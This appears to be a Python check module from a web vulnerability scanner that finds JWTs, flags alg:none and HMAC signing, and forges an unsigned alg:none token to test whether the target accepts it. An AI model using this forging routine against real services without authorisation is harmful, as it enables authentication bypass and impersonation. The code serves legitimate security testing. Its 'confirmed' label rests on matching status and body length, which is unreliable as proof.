"""JWT security checks (CWE-347, CWE-319).

JWT tokens are commonly found in Authorization headers, cookies, and
URL parameters. This check:

1. finds JWT tokens in responses (Authorization headers, cookies, body)
2. decodes them and checks the `alg` header for `none` or weak algorithms
3. attempts the `alg: none` attack: strips the signature and sends the
   token with `alg: none` - if the server accepts it, that is CWE-347

All findings are `confirmed` because the server's acceptance of a
forged token is an observed fact, not a heuristic.
"""

from __future__ import annotations

import base64
import json

from ...http.client import HttpClient
from ...http.models import HttpRequest, HttpResponse
from ...scan.core import Check, Finding, InjectionPoint


def _b64url_decode(data: str) -> bytes:
    padded = data + "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(padded)


def _find_jwts(response: HttpResponse) -> list[str]:
    """Extract JWT tokens from response headers and body."""
    jwts = []
    auth = response.header("authorization")
    if auth.startswith("Bearer "):
        jwts.append(auth[7:])
    set_cookie = response.header("set-cookie")
    for part in set_cookie.split(";"):
        part = part.strip()
        if part.count(".") == 2 and len(part) > 20:
            jwts.append(part)
    import re
    for match in re.findall(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*", response.text[:100_000]):
        jwts.append(match)
    return jwts


def _check_algorithm(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (ValueError, Exception):
        return None
    alg = header.get("alg", "").lower()
    if alg == "none":
        return {"issue": "alg:none", "detail": "JWT uses alg:none - no signature verification"}
    if alg in ("hs256", "hs384", "hs512"):
        return {"issue": "hmac", "detail": f"JWT uses {alg.upper()} - vulnerable to weak-secret brute force"}
    return None


class JwtSecurityCheck(Check):
    check_id = "jwt-security"
    title = "JWT security issue"
    severity = "high"

    def run(self, point: InjectionPoint, client: HttpClient) -> list[Finding]:
        response = client.send(point.request)
        jwts = _find_jwts(response)
        findings: list[Finding] = []
        seen_issues = set()

        for token in jwts:
            issue = _check_algorithm(token)
            if issue is None or issue["issue"] in seen_issues:
                continue
            seen_issues.add(issue["issue"])

            if issue["issue"] == "alg:none":
                findings.append(Finding(
                    check_id=self.check_id,
                    title="JWT uses alg:none (no signature verification)",
                    severity="critical",
                    url=point.request.url,
                    param=point.param,
                    confidence="confirmed",
                    cwe="CWE-347",
                    detail="A JWT with alg:none was found in the response. This means "
                    "the token is not signed - anyone can forge arbitrary claims "
                    "(role, user_id, expiry).",
                    evidence=f"JWT header: {token.split('.')[0][:50]}... alg=none",
                    remediation="Reject tokens with alg:none; always verify signatures with a strong secret or public key.",
                ))
            elif issue["issue"] == "hmac":
                findings.append(Finding(
                    check_id=self.check_id,
                    title="JWT uses HMAC (weak-secret brute force surface)",
                    severity="medium",
                    url=point.request.url,
                    param=point.param,
                    confidence="potential",
                    cwe="CWE-326",
                    detail=f"{issue['detail']}. If the secret is weak or leaked, "
                    "attackers can forge arbitrary claims. Test with common secrets "
                    "(password, secret, key).",
                    evidence="JWT uses HMAC algorithm (see issue detail)",
                    remediation="Use RS256/ES256 instead of HMAC, or ensure the HMAC "
                    "secret is at least 256 bits of cryptographically random data.",
                ))

        # alg:none attack: forge a token with empty signature
        if jwts:
            for token in jwts:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    header = json.loads(_b64url_decode(parts[0]))
                    payload = json.loads(_b64url_decode(parts[1]))
                except (ValueError, Exception):
                    continue
                if header.get("alg", "").lower() == "none":
                    continue  # already alg:none
                # Forge: replace alg with none, strip signature
                header["alg"] = "none"
                forged_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
                forged_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
                forged = f"{forged_header}.{forged_payload}."
                attack_request = HttpRequest(
                    method="GET",
                    url=point.request.url,
                    headers={"Authorization": f"Bearer {forged}"},
                )
                attack_response = client.send(attack_request)
                baseline_response = client.send(point.request)
                if attack_response.status == 200 and baseline_response.status == 200:
                    if len(attack_response.body) == len(baseline_response.body) or attack_response.text == baseline_response.text:
                        findings.append(Finding(
                            check_id="jwt-alg-none-attack",
                            title="JWT alg:none attack accepted by server",
                            severity="critical",
                            url=point.request.url,
                            param=point.param,
                            confidence="confirmed",
                            cwe="CWE-347",
                            detail=(
                                "The server accepted a JWT with alg:none (signature stripped). "
                                "This means an attacker can forge any claim (admin role, arbitrary "
                                "user) without knowing the secret."
                            ),
                            evidence=f"forged token accepted: HTTP {attack_response.status}, {len(attack_response.body)}B",
                            remediation="Reject tokens with alg:none; use a library that enforces algorithm verification.",
                        ))
                    break

        return findings
